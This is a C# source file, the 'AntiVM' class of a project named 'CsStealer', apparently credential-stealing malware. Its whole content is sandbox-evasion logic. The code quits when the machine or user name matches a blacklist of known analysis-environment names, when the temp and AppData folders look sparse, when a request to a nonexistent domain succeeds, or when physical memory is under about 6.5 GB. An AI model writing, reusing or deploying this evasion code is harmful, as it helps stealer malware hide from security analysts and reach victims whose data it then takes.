using System;
using System.Management;

namespace CsStealer
{
    class AntiVM
    {
        public static async Task Check()
        {
            List<string> BlackListedMachineNames = new List<string>
        { "bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1",
        "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez",
        "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "nettypc", "desktop-bugio", "desktop-cbgpfee", "server-pc", "tiqiyla9tw5m",
        "desktop-kalvino", "compname_4047", "desktop-19olltd", "desktop-de369se", "ea8c2e2a-d017-4", "aidanpc", "lucas-pc", "marci-pc", "acepc", "mike-pc", "desktop-iapkn1p",
        "desktop-ntu7vuo", "louise-pc", "t00917", "test42", "desktop-et51ajo", "DESKTOP-ET51AJO" };

            List<string> BlackListedUserNames = new List<string>
        { "wdagutilityaccount", "abby", "hmarc", "patex", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a",
        "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "fred", "server", "bvjchrpnsxn", "harry johnson", "sqgfof3g", "lucas", "mike", "patex", "h7dk1xpr", "louise",
        "user01", "test", "rgzcbuyrznreg", "bruno", "george", "administrator" };

            if (BlackListedMachineNames.Contains(Environment.MachineName))
            {
                Environment.Exit(0);
            }
            else if (BlackListedUserNames.Contains(Environment.UserName))
            {
                Environment.Exit(0);
            }

            if (Directory.GetFileSystemEntries(Path.GetTempPath()).Length < 20)
            {
                Environment.Exit(0);
            }
            else if (Directory.GetFileSystemEntries(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).Length < 12)
            {
                Environment.Exit(0);
            }

            try
            {
                // Some people asked me why this web request. Because some VMs/Analyze environments return success for every web requests of the analyzed payload, 
                // so it performs a request on an inexistent url to verify this

                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage Resp = await client.GetAsync("https://nooneontop.gouv");
                }

                Environment.Exit(0);
            }
            catch
            {

            }

            try
            {
                using (var searcher = new ManagementObjectSearcher("select TotalPhysicalMemory from Win32_ComputerSystem"))
                {
                    ManagementObject? mo = searcher.Get().Cast<ManagementObject>().FirstOrDefault();
                    if (mo != null)
                    {
                        if (ulong.TryParse(mo["TotalPhysicalMemory"]?.ToString() ?? "0", out ulong totalBytes))
                        {
                            if (totalBytes / (1024 * 1024) < 6500)
                            {
                                Environment.Exit(0);
                            }
                        }
                    }
                }
            }
            catch
            {

            }
        }
    }
}